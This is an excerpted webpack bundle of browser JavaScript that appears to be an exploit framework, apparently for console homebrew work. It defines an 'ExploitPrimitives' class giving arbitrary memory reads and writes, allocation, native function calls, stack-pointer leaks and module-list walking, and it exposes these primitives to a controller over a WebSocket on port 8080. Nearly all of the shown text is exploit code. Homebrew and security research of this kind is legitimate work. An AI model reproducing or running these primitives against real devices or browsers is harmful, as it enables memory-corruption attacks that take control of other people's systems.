...
/***/ function(module, exports, __webpack_require__) {
	...
	var _primitives = __webpack_require__(300);
	
	var _primitives2 = _interopRequireDefault(_primitives);
	
	var _handlers = __webpack_require__(301);
	...
	(function () {
	  var wsPath = "ws://" + window.location.hostname + ":8080/";
...
/***/ function(module, exports) {
	...
	var dlog = exports.dlog = log;
	
	// add a pair of 32-bit words
	var add64 = exports.add64 = function add64(addr, off) {
	  if (typeof off == 'number') off = [off, 0];
	
	  var _addr = _slicedToArray(addr, 2),
	      alo = _addr[0],
	      ahi = _addr[1];
	
	  var _off = off,
	      _off2 = _slicedToArray(_off, 2),
	      blo = _off2[0],
	      bhi = _off2[1];
	...
	var add2 = exports.add2 = add64;
	
	var toString64 = exports.toString64 = function toString64(lo, hi) {
	  if (arguments.length == 1) {
	    hi = lo[1];
	    lo = lo[0];
	  }
	...
	var paddr = exports.paddr = toString64;
	
	var isNullPointer = exports.isNullPointer = function isNullPointer(addr) {
...
/***/ function(module, exports, __webpack_require__) {
	...
	var ExploitPrimitives = function () {
	  function ExploitPrimitives(exploitMe) {
	    _classCallCheck(this, ExploitPrimitives);
	  ...
	  _createClass(ExploitPrimitives, [{
	    key: "read32",
	    value: function read32(addr, offset) {
	      if (arguments.length == 1) {
	        offset = 0;
	      }
	    ...
	    key: "read4",
	    value: function read4(addr, offset) {
	    ...
	    key: "read64",
	    value: function read64(addr, offset) {
	      if (arguments.length == 1) {
	        offset = 0;
	      }
	    ...
	    key: "read8",
	    value: function read8(addr, offset) {
	    ...
	    key: "write32",
	    value: function write32(val, addr, offset) {
	    ...
	    key: "write4",
	    value: function write4(val, addr, offset) {
	    ...
	    key: "write64",
	    value: function write64(val, addr, offset) {
	      if (arguments.length == 2) {
	        offset = 0;
	    ...
	    key: "write8",
	    value: function write8(val, addr, offset) {
	      this.write64(val, addr, offset);
	    }
	  }, {
	    key: "malloc",
	    value: function malloc(length) {
	    ...
	    key: "mempeek",
	    value: function mempeek(addr, size, peeker) {
	      var ab = new ArrayBuffer(0);
	      var taddr = this.read64(this.getAddr(ab), 4);
	
	      var origPtr = this.read64(taddr, 6);
	      var origSize = this.read32(taddr, 8);
	    ...
	    key: "read",
	    value: function read(addr, target, length) {
	      if (arguments.length == 2) {
	        length = target.length;
	      }
	
	      return this.mempeek(addr, length, function (ab) {
	    ...
	    key: "write",
	    value: function write(addr, value, length) {
	      if (arguments.length == 2) {
	        length = value.length;
	      }
	    ...
	    key: "call",
	    value: function call(funcptr, args, fargs, registers, dump_regs) {
	    ...
	    value: function getSP() {
	      ...
	      var curptr = this.read64(this.funcaddr, 8);
	      ...
	      var sp = utils.add64(this.read64(struct3, 0), -0x18);
	      utils.log("Got stack pointer: " + utils.toString64(sp));
	
	      for (var _i = 0; _i < saved.length; _i++) {
	        this.write32(saved[_i], fixed, _i);
	      }
	    ...
	    value: function walkList() {
	      ...
	      while (true) {
	        ...
	        var modoff = this.read32(addr, 1);
	        addr = utils.add64(addr, modoff);
	        var modstr = this.read32(addr, 6);
	      ...
	      while (true) {
	        var _nro = this.read64(addr, 8);
	        if (utils.isNullPointer(_nro)) {
	          utils.log("Hm, hit the end of things. Back in RTLD?");
	          return;
	        }
	
	        if (this.read32(_nro, this.read32(_nro, 1) >> 2) == 0x30444f4d) {
	          if (this.read32(_nro, 4) == 0x8DCDF8 && this.read32(_nro, 5) == 0x959620) {
	            return _nro;
	          }
	        } else {
	...
	exports.default = ExploitPrimitives;
	;
	...
	exports.default = function (prims) {
	  return {
	    malloc: function malloc(data, json, bin) {
	      var ptr = prims.malloc(data.length);
	      return json({
	        address: ptr,
	        length: data.length
	      });
	    },
	    free: function free(data, json, bin) {
	    ...
	    get: function get(data, json, bin) {
	      json(function () {
	        switch (data.field) {
	          ...
	          case "mainAddr":
	            return { value: prims.mainaddr };
	          case "sp":
	            return { value: prims.getSP() };
	          case "tls":
